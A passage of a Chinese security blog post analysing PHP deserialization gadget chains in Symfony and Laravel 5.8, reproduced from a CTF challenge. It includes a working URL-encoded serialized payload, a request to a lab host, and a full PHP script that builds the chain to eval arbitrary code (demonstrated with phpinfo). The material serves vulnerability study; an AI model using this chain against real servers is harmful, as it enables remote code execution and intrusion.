$proxyadapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\ProxyAdapter(<span class="number">1</span>,<span class="string">'system'</span>);</div><div class="line">    $tagawareadapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">array</span>($cacheitem),$proxyadapter);</div><div class="line">    <span class="keyword">echo</span> urlencode(serialize($tagawareadapter));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>至此，symfony POP链寻找与调用分析完毕。</p>
+<h2 id="x01-laravel-5.8-pop链">0x01 Laravel 5.8 POP链</h2>
+<ul>
+<li>在原赛题中，出题者直接把这条利用链的入口 <code>__destruct</code> 函数注释了。</li>
+</ul>
+<h3 id="复现-1">复现</h3>
+<ul>
+<li>只需要把 <code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code> 第57行的注释还原即可复现。</li>
+</ul>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A18%3A%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3B%7D%7D%7D</div></pre></td></tr></table></figure>
+<ul>
+<li>访问 <code>http://192.168.153.129:10086/public/?payload=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A18%3A%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3B%7D%7D%7D</code> 即可调用phpinfo</li>
+</ul>
+<h3 id="pop链分析">POP链分析</h3>
+<ul>
+<li>首先是入口魔术方法， <code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code> 第57行：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里需要寻找一个类，它包含dispatch函数并且能够被进一步利用。 在这里找到 <code>vendor\laravel\framework\src\Illuminate\Bus\Dispatcher.php</code> 中的Dispatcher类可以进一步利用，跟进 <code>dispatch</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($command)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue($command);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchNow($command);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>这里第一个条件需要满足 <code>$this-&gt;commandShouldBeQueued($command)</code> ，查看代码，需要 <code>$command</code> 必须是一个实现了 <code>ShouldQueue</code> 接口的类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在这里，找到 <code>vendor\laravel\framework\src\Illuminate\Foundation\Console\QueuedCommand.php</code> 中的 <code>QueuedCommand</code> 类是满足条件并且能够进一步利用的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span> <span class="keyword">implements</span> <span class="title">ShouldQueue</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>继续跟进 <code>return $this-&gt;dispatchToQueue($command);</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span><span class="params">($command)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $connection = $command-&gt;connection ?? <span class="keyword">null</span>;</div><div class="line"></div><div class="line">        $queue = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, $connection);<span class="comment">//注意此处</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (! $queue <span class="keyword">instanceof</span> Queue) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'Queue resolver did not return a Queue implementation.'</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (method_exists($command, <span class="string">'queue'</span>)) &#123;</div><div class="line">            <span class="keyword">return</span> $command-&gt;queue($queue, $command);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pushCommandToQueue($queue, $command);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>很容易地注意到 <code>$queue = call_user_func($this-&gt;queueResolver, $connection);</code> 调用了 <code>call_user_func</code> ，并且 <code>$this-&gt;queueResolver</code> 可控，回溯后也很容易发现 <code>$command</code> 也可控（通过 <code>$this-&gt;event</code> 即可控制）。所以在这里可以执行任意<strong>类包含的函数</strong>。在这里就需要找出一个类，它能够执行<strong>任意函数</strong>，</p>
+<p>在 <code>vendor\mockery\mockery\library\Mockery\Loader\EvalLoader.php</code> 中出现了能够利用的类 <code>EvalLoader</code> ，这里的 <code>load</code> 函数通过eval直接执行了任意代码，并且 <code>code</code> 属性可控；所以可以调用该类的 <code>load</code> 函数，从而执行任意PHP代码；但是在之前有一个条件语句，所以在这里还需要找到两个类，第一个类具有 <code>code</code> 属性；第二个类有 <code>getName</code> 函数，用来作为第一个类的config属性：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvalLoader</span> <span class="keyword">implements</span> <span class="title">Loader</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">(MockDefinition $definition)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span> (class_exists($definition-&gt;getClassName(), <span class="keyword">false</span>)) &#123;<span class="comment">//注意这个条件，需要再找一个类</span></div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">eval</span>(<span class="string">"?&gt;"</span> . $definition-&gt;getCode());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>其中， <code>getClassName</code> 函数内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>在这里找到的两个类是 <code>vendor\mockery\mockery\library\Mockery\Generator\MockDefinition.php</code> 和 <code>vendor\nikic\php-parser\lib\PhpParser\Node\Scalar\MagicConst\Line.php</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockDefinition</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $config;</div><div class="line">    <span class="keyword">protected</span> $code;</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Line</span> <span class="keyword">extends</span> <span class="title">MagicConst</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span><span class="params">()</span> : <span class="title">string</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'__LINE__'</span>;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>OK，到这里，我们一共找到了6个类，经过一系列的分析，终于能够执行任意PHP代码了；mochazz师傅给出的payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">Line</span> &#123;&#125;</div><div class="line">&#125;</div><div class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">protected</span> $<span class="title">config</span>;</div><div class="line">        <span class="keyword">protected</span> $code;</div><div class="line"></div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config, $code)</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;config = $config;</div><div class="line">            <span class="keyword">$this</span>-&gt;code = $code;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</div><div class="line">&#125;</div><div class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">public</span> $<span class="title">connection</span>;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</div><div class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></div><div class="line">    &#123;</div><div class="line">        <span class="title">protected</span> $<span class="title">events</span>;</div><div class="line">        <span class="keyword">protected</span> $event;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;events = $events;</div><div class="line">            <span class="keyword">$this</span>-&gt;event = $event;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">namespace</span>&#123;</div><div class="line">    $<span class="title">line</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Line</span>();</div><div class="line">    $mockdefinition = <span class="keyword">new</span> Mockery\Generator\MockDefinition($line,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</div><div class="line">    $evalloader = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</div><div class="line">    $dispatcher = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($evalloader,<span class="string">'load'</span>));</div><div class="line">    $queuedcommand = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand($mockdefinition);</div><div class="line">    $pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);</div><div class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingbroadcast));</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>至此，Laravel 5.8 POP链寻找与调用分析完毕；整个POP链较第一个POP链要复杂的多，设计到了6个类的寻找，可以想象真正构造时还是很费力的。</p>
+<h2 id="总结">总结</h2>
+<ul>
+<li>在构造POP链的时候， <code>this-&gt;xxx</code> 是我们可以任意赋值的。</li>
+<li>如果 <code>this-&gt;xxx</code> 是调用的对象，则需要全局搜索，找出可以利用的类进一步分析，此时可以看作POP链进行到了下一环。</li>
+<li>最后动态调用的时候，则需要阅读PHP文档，找出参数数量、位置都符合的利用函数。</li>
+<li>在进行POP链构造时，需要很高的PHP功底，熟悉整个框架中能够利用的类，充分理解类相关的概念；同时，需要想象每种情况下的执行情况，对各个条件分支都有考虑。</li>
+<li>PHP字符串动态调用在POP链构造时一般不能起作用（在类中的属性字符串不能动态调用，除非是PHP7.1且加上括号的新语法）。</li>
+<li>构造payload时，若出现protected或private属性时，可以在 <code>__construct</code> 函数下直接赋值避免写get、set函数组。</li>
+</ul>
+<h2 id="参考资料">参考资料</h2>
+<ul>
+<li>Code Reuse Attacks in PHP: Automated POP Chain Generation</li>
+<li>https://xz.aliyun.com/t/5911</li>
+</ul>
+
+        
+        </div>
+        
+        
+        
+        
+<div id="copyright-div">    
+
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+          <strong>本文作者：<a href="https://github.com/HACHp1">HACHp1</a> </strong>
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文链接：</strong>
+        <a href="/posts/Web安全/20190906-laravel_pop1.html" title="Laravel POP链简析">https://hachp1.github.io/posts/Web安全/20190906-laravel_pop1.html</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明： </strong>
+        本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。非商业转载请注明作者及出处。商业转载请联系作者本人。
+      </li>
+    </ul>
+ 
+</div>
+
+
+        
+        
+        
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more">分享到：</a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间">QQ空间</a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博">新浪微博</a>
+    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博">腾讯微博</a>
+    <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网">人人网</a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信">微信</a>
+</div>
+<script>
+window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"share":{"bdSize":16}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+<style>
+    .bdshare_popup_box {
+        border-radius: 4px;
+        border: #e1e1e1 solid 1px;
+    }
+    .bdshare-button-style0-16 a,
+    .bdshare-button-style0-16 .bds_more {
+        padding-left: 20px;
+        margin: 6px 10px 6px 0;
+    }
+    .bdshare_dialog_list a,
+    .bdshare_popup_list a,
+    .bdshare_popup_bottom a {
+        font-family: 'Microsoft Yahei';
+    }
+    .bdshare_popup_top {
+        display: none;
+    }
+    .bdshare_popup_bottom {
+        height: auto;
+        padding: 5px;
+    }
+</style>
+
+
+</div>
+
+            
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/posts/机器学习/20191005-ROC_REC_PR.html" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">上一篇</strong>
+            <div class="article-nav-title">
+                
+                    ROC、PR和REC曲线、AUC、AOC与肘部方法浅析
+                
+            </div>
+        </a>
+    
+    
+        <a href="/posts/环境搭建/20190903-php7_xdebug.html" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">docker中的php7代码调试</div>
+        </a>
+    
+</nav>
+
+
+    
+    
+    
+</article>
+
+
+    
+    
+        <section id="comments">
+    <div id="valine-thread"></div>
+</section>
+    
+
+</section>
+            
+                
+<aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20210615-qwb2021.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/cat.jpg)" alt="强网杯2021 easyxss wp" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20210615-qwb2021.html" class="title">强网杯2021 easyxss wp</a></p>
+                            <p class="item-date"><time datetime="2021-06-15T06:09:42.000Z" itemprop="datePublished">2021-06-15</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20210607-open_redirect01.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/eggs.jpg)" alt="由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20210607-open_redirect01.html" class="title">由一道CTF学习相对路径重定向引发的开放重定向：津门杯2021-GoOSS</a></p>
+                            <p class="item-date"><time datetime="2021-06-07T06:57:35.000Z" itemprop="datePublished">2021-06-07</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20210309-ant2021.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/cat.jpg)" alt="AntCTF2021 部分WP" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20210309-ant2021.html" class="title">AntCTF2021 部分WP</a></p>
+                            <p class="item-date"><time datetime="2021-03-09T11:04:04.000Z" itemprop="datePublished">2021-03-09</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20201126-wdbunfinish.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/eggs.jpg)" alt="[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20201126-wdbunfinish.html" class="title">[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区</a></p>
+                            <p class="item-date"><time datetime="2020-11-26T08:47:27.000Z" itemprop="datePublished">2020-11-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20201019-sw_safe.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/planet_red.png)" alt="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20201019-sw_safe.html" class="title">从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss</a></p>
+                            <p class="item-date"><time datetime="2020-10-19T13:54:52.000Z" itemprop="datePublished">2020-10-19</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">标签</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux日常/">Linux日常</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/对抗样本/">对抗样本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心情随笔/">心情随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习-算法/">机器学习-算法</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习初步/">机器学习初步</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a><span class="tag-list-count">6</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">标签云</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/Linux日常/" style="font-size: 11.67px;">Linux日常</a> <a href="/tags/Web安全/" style="font-size: 20px;">Web安全</a> <a href="/tags/对抗样本/" style="font-size: 10px;">对抗样本</a> <a href="/tags/心情随笔/" style="font-size: 10px;">心情随笔</a> <a href="/tags/机器学习/" style="font-size: 18.33px;">机器学习</a> <a href="/tags/机器学习-算法/" style="font-size: 15px;">机器学习-算法</a> <a href="/tags/机器学习初步/" style="font-size: 13.33px;">机器学习初步</a> <a href="/tags/漏洞分析/" style="font-size: 16.67px;">漏洞分析</a>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="https://redogwu.github.io">redogWu</a>
+                    </li>
+                
+                    <li>
+                        <a href="https://hpasserby.me">Hpasserby的pwn</a>
+                    </li>
+                
+                    <li>
+                        <a href="https://jygzyc.github.io">jygzyc</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2022 HACHp1<br>
+            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.6/dist/Valine.min.js"></script>
+    <script>
+        new Valine({
+            el: '#valine-thread' ,
+            notify:true,
+            verify:true,
+            app_id: 'GpqOpUBld8udMg3PSOCDbYr7-gzGzoHsz',
+            app_key: 'k6nxcdbcy4MrjOq2DssFFljB',
+            placeholder: '少侠，留下几句话，我们喝一壶啊 ヾﾉ≧∀≦)o （支持markdown语句，可插入图片）'
+        });
+    </script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+    
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
